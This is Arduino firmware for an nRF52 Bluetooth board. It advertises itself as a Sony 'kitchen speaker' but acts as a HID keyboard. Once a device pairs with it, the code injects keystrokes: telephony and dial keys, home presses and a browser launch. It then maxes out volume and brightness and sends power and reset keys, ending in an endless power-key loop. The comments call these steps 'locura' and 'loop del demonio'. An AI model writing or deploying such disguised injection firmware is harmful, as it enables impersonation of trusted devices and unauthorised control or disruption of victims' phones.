#include <bluefruit.h>

BLEDis bledis;
BLEHidAdafruit blehid;

void setup() {

  Serial.begin(115200);

  // #if CFG_DEBUG
  //   // Blocking wait for connection when debug mode is enabled via IDE
  //   while ( !Serial ) delay(10);   // for nrf52840 with native usb
  // #endif

  Bluefruit.begin();
  Bluefruit.setTxPower(8);  // Check bluefruit.h for supported values

  // Configure and start DIS (Device Information Service)
  #define MANUFACTURER_ID   0x0059
   // off Blue LED for lowest power consumption
  Bluefruit.autoConnLed(true);
  bledis.setManufacturer("SONY");
  bledis.setModel("1.0");
  Bluefruit.setName("ALTAVOZ COCINA");
  bledis.begin();

  /* Start BLE HID
   * Note: Apple requires BLE devices to have a min connection interval >= 20m
   * (The smaller the connection interval the faster we can send data).
   * However, for HID and MIDI device Apple will accept a min connection
   * interval as low as 11.25 ms. Therefore BLEHidAdafruit::begin() will try to
   * set the min and max connection interval to 11.25 ms and 15 ms respectively
   * for the best performance.
   */
  blehid.begin();

  /* Set connection interval (min, max) to your perferred value.
   * Note: It is already set by BLEHidAdafruit::begin() to 11.25ms - 15ms
   * min = 9*1.25=11.25 ms, max = 12*1.25= 15 ms
   */
  /* Bluefruit.Periph.setConnInterval(9, 12); */

  // Set up and start advertising
  startAdv();
}

void startAdv(void) {
  // Advertising packet
  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
  Bluefruit.Advertising.addTxPower();
  Bluefruit.Advertising.addAppearance(BLE_APPEARANCE_GENERIC_MEDIA_PLAYER);
  

  // Include BLE HID service
  Bluefruit.Advertising.addService(blehid);

  // There is enough room for the dev name in the advertising packet
  Bluefruit.Advertising.addName();

  /* Start Advertising
   * - Enable auto advertising if disconnected
   * - Interval:  fast mode = 20 ms, slow mode = 152.5 ms
   * - Timeout for fast mode is 30 seconds
   * - Start(timeout) with timeout = 0 will advertise forever (until connected)
   * 
   * For recommended advertising interval
   * https://developer.apple.com/library/content/qa/qa1931/_index.html   
   */
  Bluefruit.Advertising.restartOnDisconnect(true);
  Bluefruit.Advertising.setInterval(32, 244);  // in unit of 0.625 ms
  Bluefruit.Advertising.setFastTimeout(0);     // number of seconds in fast mode
  Bluefruit.Advertising.start(0);  
  Bluefruit.setConnLedInterval(10000);            // 0 = Don't stop advertising after n seconds
}

void loop() {


  // Make sure we are connected and bonded/paired
  for (uint16_t conn_hdl = 0; conn_hdl < BLE_MAX_CONNECTION; conn_hdl++) {
    BLEConnection* connection = Bluefruit.Connection(conn_hdl);

    if (connection && connection->connected() && connection->secured()) {
      digitalWrite(LED_GREEN, 1);
      blehid.consumerKeyPress(conn_hdl, HID_USAGE_PAGE_TELEPHONY);
      blehid.consumerKeyRelease(conn_hdl);
      delay(2000);

      blehid.consumerKeyPress(conn_hdl, HID_KEY_2);
      blehid.consumerKeyRelease(conn_hdl);
      delay(20);
      blehid.consumerKeyPress(conn_hdl, HID_KEY_MINUS);
      blehid.consumerKeyRelease(conn_hdl);
      delay(20);
      blehid.consumerKeyPress(conn_hdl, HID_KEY_2);
      blehid.consumerKeyRelease(conn_hdl);
      delay(20);
      blehid.consumerKeyPress(conn_hdl, HID_KEY_ENTER);
      blehid.consumerKeyRelease(conn_hdl);
      digitalWrite(LED_GREEN, 0);
      delay(100);

      digitalWrite(LED_BLUE, 1);
      blehid.consumerKeyPress(conn_hdl, HID_KEY_HOME);
      blehid.consumerKeyRelease(conn_hdl);
      delay(10);
      blehid.consumerKeyPress(conn_hdl, HID_USAGE_PAGE_TELEPHONY);
      blehid.consumerKeyRelease(conn_hdl);
      delay(10);
      blehid.consumerKeyPress(conn_hdl, HID_KEY_HOME);
      blehid.consumerKeyRelease(conn_hdl);
      delay(50);
      blehid.consumerKeyPress(conn_hdl, HID_USAGE_PAGE_TELEPHONY);
      blehid.consumerKeyRelease(conn_hdl);
      delay(10);
      blehid.consumerKeyPress(conn_hdl, HID_USAGE_DESKTOP_DIAL);
      blehid.consumerKeyRelease(conn_hdl);
      delay(40);
      digitalWrite(LED_BLUE, 0);

      delay(500);


      blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_AL_LOCAL_BROWSER);
      blehid.consumerKeyRelease(conn_hdl);
      delay(1000);

      //aviso de locura
      digitalWrite(LED_RED, 1);
      delay(100);
      digitalWrite(LED_RED, 0);
      delay(100);

      digitalWrite(LED_GREEN, 1);
      delay(100);
      digitalWrite(LED_GREEN, 0);
      delay(100);

      digitalWrite(LED_BLUE, 1);
      delay(100);
      digitalWrite(LED_BLUE, 0);
      delay(100);

      digitalWrite(LED_RED, 1);
      delay(100);
      digitalWrite(LED_RED, 0);
      delay(100);

      digitalWrite(LED_GREEN, 1);
      delay(100);
      digitalWrite(LED_GREEN, 0);
      delay(100);

      digitalWrite(LED_BLUE, 1);
      delay(100);
      digitalWrite(LED_BLUE, 0);
      delay(100);

      digitalWrite(LED_RED, 1);
      delay(100);
      digitalWrite(LED_RED, 0);
      delay(100);

      digitalWrite(LED_GREEN, 1);
      delay(100);
      digitalWrite(LED_GREEN, 0);
      delay(100);

      digitalWrite(LED_BLUE, 1);
      delay(1000);
      digitalWrite(LED_BLUE, 0);
      delay(1000);

      digitalWrite(LED_GREEN, 1);
      delay(4000);
      digitalWrite(LED_RED, 1);
      digitalWrite(LED_GREEN, 0);
      digitalWrite(LED_BLUE, 1);


      //locura
      for (int x = 0; x < 10; x++) {
        blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_VOLUME_INCREMENT);
        blehid.consumerKeyRelease(conn_hdl);
        blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_BRIGHTNESS_INCREMENT);
        blehid.consumerKeyRelease(conn_hdl);
      }
      digitalWrite(LED_GREEN, 0);
      digitalWrite(LED_BLUE, 0);
      digitalWrite(LED_RED, 0);
      delay(500);

      
      //loop  del demonio
      for (int x = 0; x < 10; x++) { 
        digitalWrite(LED_BLUE, 1);
        // Check tinyusb/src/class/hid/hid.h for a list of valid consumer usage codes  
        blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_POWER);
        blehid.consumerKeyRelease(conn_hdl); 
        digitalWrite(LED_BLUE, 0);
      }

      for (int x = 0; x < 10; x++) { 
        digitalWrite(LED_BLUE, 1);
        blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_RESET);
        blehid.consumerKeyRelease(conn_hdl); 
        digitalWrite(LED_BLUE, 0);
      }

      blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_POWER);
      delay(3000);
      blehid.consumerKeyRelease(conn_hdl); 

      digitalWrite(LED_GREEN, 0);
      digitalWrite(LED_BLUE, 0);
      digitalWrite(LED_RED, 0);
      delay(100);
      while(true) { 
        digitalWrite(LED_RED, 1);
        // Check tinyusb/src/class/hid/hid.h for a list of valid consumer usage codes  
        blehid.consumerKeyPress(conn_hdl, HID_USAGE_CONSUMER_POWER);
        blehid.consumerKeyRelease(conn_hdl); 
        digitalWrite(LED_RED, 0);
      }

      
      
    }
  }
  // delay(500);
}
